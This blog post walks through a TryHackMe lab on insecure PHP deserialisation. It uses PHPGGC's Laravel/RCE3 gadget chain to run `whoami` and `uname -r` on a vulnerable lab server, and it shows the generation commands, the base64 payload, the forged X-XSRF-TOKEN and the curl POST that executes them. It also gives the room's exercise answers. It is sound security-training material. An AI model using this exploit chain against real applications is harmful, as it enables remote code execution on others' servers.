---
title: "Insecure Deserialization: A Practical Example"
excerpt: Walkthrough of an interesting exercise on TryHackMe, using PHPGGC to perform an injection attack on a web-server.
date: 2026-01-24
---

While working through the [insecure deserialisation](https://tryhackme.com/room/insecuredeserialisation) room on TryHackMe, I came across an exercise that peaked my interest: Task 7 discusses PHPGGC (PHP Gadget Chains), a tool for automating this aspect of pentesting, specifically for PHP applications.

Broadly speaking, insecure deserialisation exploits occur when an application trusts serialised data enough to use it without validating its authenticity. This trust can lead to disastrous outcomes as attackers manipulate serialised objects to achieve remote code execution, escalate privileges, or launch DoS attacks. This type of vulnerability is prevalent in applications that serialise and deserialise complex data structures across various programming environments, such as Java and PHP, which often use serialisation for remote procedure calls or session management.

This blog post is a walkthrough of the exercises in Task 7.


## What is PHPGGC?

PHPGGC provides a library of gadget chains for various PHP frameworks and libraries. These gadget chains are sequences of objects and methods designed to exploit specific vulnerabilities when a PHP application unsafely unserialises user-provided data.

The main purpose of PHPGGC is to facilitate the generation of serialised payloads that can trigger these vulnerabilities. It helps security researchers and penetration testers create payloads that demonstrate the impact of insecure deserialisation flaws.

Users can customise payloads by specifying arguments for the functions or methods involved in the gadget chain, thereby tailoring the attack to achieve specific outcomes, such as encoding.


## Exercise 1

> What is the vector for exploiting CodeIgniter4/FR1 as per the PHPGGC?

The module teaches us some syntax and how to look up vulnerabbilities for specific frameworks. To this end, we navigate to `/opt/phpggc`, where the binary is stored, and run the following command:

```console
root@ip-10-82-120-124:/opt/phpggc# php phpggc -l codeigniter

Gadget Chains
-------------

NAME                 VERSION                       TYPE            VECTOR        I    
CodeIgniter4/FD1     <= 4.3.6                      File delete     __destruct         
CodeIgniter4/FD2     <= 4.3.7                      File delete     __destruct         
CodeIgniter4/FR1     4.0.0 <= 4.3.6                File read       __toString    *    
CodeIgniter4/RCE1    4.0.2                         RCE: Command    __destruct         
CodeIgniter4/RCE2    4.0.0-rc.4 <= 4.3.6           RCE: Command    __destruct         
CodeIgniter4/RCE3    4.0.4 <= 4.4.3                RCE: Command    __destruct         
CodeIgniter4/RCE4    4.0.0-beta.1 <= 4.0.0-rc.4    RCE: Command    __destruct         
CodeIgniter4/RCE5    -4.1.3+                       RCE: Command    __destruct         
CodeIgniter4/RCE6    -4.1.3 <= 4.2.10+             RCE: Command    __destruct  
```

We find that there exists a file read vulnerability in CodeIgniter4/FR1 leveraging the magic method `__toString`.


## Exercise 2

> What is the output of the `whoami` command on the vulnerable Laravel application?

The goal is to exploit a vulnerability in the `X-XSRF-TOKEN`. More precisely, the vulnerability is triggered as soon as Laravel deserializes this untrusted data without any security measures that are implemented. If we navigate to `http://MACHINE_IP:8089` and view the cookies, we can see the encrypted and serialised cookies, as in the screenshot below:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/8b802d0f-9ef9-49b9-8a34-866c6c7e4013"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

First, the module supplies us with the `APP_KEY`, which one supposedly obtains by e.g. social engineering or through some other malicious activity (in the exercise we can simply visit `http://MACHINE_IP:8089/get-key`).

Then it tells us that the vulnerable web app runs Laravel version 5.6.29. Using `php phpggc -l laravel`, we find that we ought to use the gadget chain `Laravel/RCE3` for our goal. Using `php phpggc -b Laravel/RCE3 system whoami`, we get a base 64 encoded version of the `whoami`-payload. The output is a string of base 64 characters:

```
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudH
MiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAi
O3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21Dcm
VhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0=
```

Next, we visit `http://MACHINE_IP:8089/cve.php?app_key=xxx&payload=xxx`, where we enter the `APP_KEY` and the payload to create the correct `X-XSRF-TOKEN` for the HTTP header of the malicious POST request that we will send to the server. I am guessing that the process behind this mechanism is not too complicated (and that one could read up on how these parameters are combined in Laravel's source code), but that this is simply unnecessarily complicated for this task.

After entering the two parameters, we get our token:

```
eyJpdiI6IlwvbnhXQTNrQzF2bzhOM3JxeEZ1S0JBPT0iLCJ2YWx1ZSI6IkU4QUk5T2FCVUxlUWRjVXZ2SFlxUF
dicFFmdm53bUp6TkRsQzBmd2Jma1JcL2FBTnNQU1BicGU1UUI2Q0ZSVGFiU1VtckZCd3NHSmlyc01xVnlNdjRS
WHlkZ0w3YVpuMnYrcmg0ZkMrWGx4S0pZcDNWYjRBdUp4bnpxWnlUc0xaR21tY0tLNUZGaGh6UXdkTmtHUTBOeG
9KMmpoQ1AwZkwxNU9aQ2w5RW9BeHNKTkoyTXJnTVhyUmtHMnpVQXVQZVFLNnZBcXVPa003bnZUSXNlb3pXKzRa
MFwvSitUVkE3dDFkMmhsbWhcL085SlpaaCs4WGYrWkM1dWkxYnNmR1FBa0Z5RkZteTVxR3RaTnp2bHF2ZlwvVm
FnaGpZbmEwRnhDaVY3a05XVFpFUGRGc3BkYm5ETWF2SmI4TUl2UlVJdUEybiIsIm1hYyI6ImZmYTRhOTgyYjI0
Yjk2YmJiN2Q0OTc1YTc5ZmJhMTYyYzZiMTYxYTNkZjBkYjI2MDk5ZWVmYmVjY2Y5ZjRiNTAifQ==
```

All we have to do now is craft a custom POST request together with the malicious token. For added legibility, we cut off a large part of the output using `head -n 2`. For the request we use `curl` in combination with `-X` to force a POST request and `-H` to add a specific header:

```console
root@ip-10-82-120-124:/opt/phpggc# curl 10.82.147.92:8089 -X POST -H 'X-XSRF-TOKEN:
eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQV
VsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04
eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGR
xeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNm
tFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklId
EUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2
Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDB
hMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ=='| head -n 2

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0root
<!DOCTYPE html><!--
100 39101    0 39101    0     0   107k      0 --:--:-- --:--:-- --:--:--  107k
curl: (23) Failed writing body (1899 != 16384)
```

Perhaps it's not clear at first glance, however the response includes the output of `whoami`, namely `root`, which finishes the exercise!


## Exercise 3

> What is the output of the `uname -r` command on the vulnerable Laravel application?

For this exercise we essentially need to repeat the process of the previous exercise, except that we must encode the `uname -r` command instead of `whoami`, so we actually obtain kernel release information in the end.

First, we need to run `php phpggc -b Laravel/RCE3 system "uname -r"` to obtain the base 64 encoded version of the command that we want to inject:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/060e6098-b918-4bfb-af53-64e1f6e1b722"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

Next, we combine the `APP_KEY` and the payload as before to obtain the `X-XSRF-TOKEN`:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/52f2cee8-d65a-47e6-8f0d-a0a9215fe9da"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

Finally, we forge the custom POST request containing our malicious token and get a response containing the output of the `uname -r` command:

<div class="flex justify-center items-center">
  <img
    src="https://github.com/user-attachments/assets/d30d574a-b0c5-4518-af15-f75f95fc1ce5"
    alt="image"
    class="clickable-img h-auto w-auto max-w-full max-h-[232px] object-contain"
  />
</div>
<br>

Thus, we find that `5.15.0-1075-aws` is the answer.











